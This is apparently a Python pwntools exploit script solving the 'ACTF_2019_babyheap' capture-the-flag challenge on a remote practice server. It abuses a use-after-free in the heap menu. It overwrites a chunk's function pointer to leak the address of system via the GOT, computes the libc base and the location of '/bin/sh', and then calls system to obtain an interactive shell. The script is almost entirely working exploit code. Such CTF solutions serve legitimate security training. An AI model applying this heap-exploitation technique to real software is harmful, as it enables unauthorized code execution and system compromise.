#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 26307
elfpath = 'ACTF_2019_babyheap'
ldpath = ''
libcpath = '/home/leo/tools/glibc-all-in-one/libs/libc6_2.27-3ubuntu1_amd64.so'

if args.LOCAL:
    p = process([elfpath])
    # gdb.attach(p)
else:
    p = remote(host, port)
    
s = lambda content: p.send(content)
sl = lambda content: p.sendline(content)
r = lambda n: p.recv(n)
ru = lambda pattern: p.recvuntil(pattern)
rl = lambda: p.recvline()
ru7f = lambda: p.recvuntil(b'\x7f')
su = lambda x: p.success(x)
shell = lambda: p.interactive()

def command(c):
    ru(b'Your choice: ')
    sl(str(c).encode())

def add(size, content):
    command(1)
    ru(b'Please input size: ')
    sl(str(size).encode())
    ru(b'Please input content: ')
    s(content)
# def edit(index, size, content):

def free(index):
    command(2)
    ru(b'Please input list index: ')
    sl(str(index).encode())

def show(index):
    command(3)
    ru(b'Please input list index: ')
    sl(str(index).encode())
    
# start pwning
'''
uaf
'''
e = ELF(elfpath)
add(0x80, b'aaaa') # id 0
add(0x80, b'aaaa') # id 1
add(0x80, b'aaaa') # id 2
free(0)
free(1)
add(0x10, p64(e.got['system']))
show(0)

system_addr = u64(ru7f()[-6:]+b'\x00'*2)
# from LibcSearcher import *
# libc = LibcSearcher('system', system_addr)
# # print(len(libc))
# for l in libc:
#     print(l)
libc = ELF(libcpath)
libc_base = system_addr - libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
free(3)
add(0x10, p64(binsh) + p64(system_addr))
show(0)

shell()


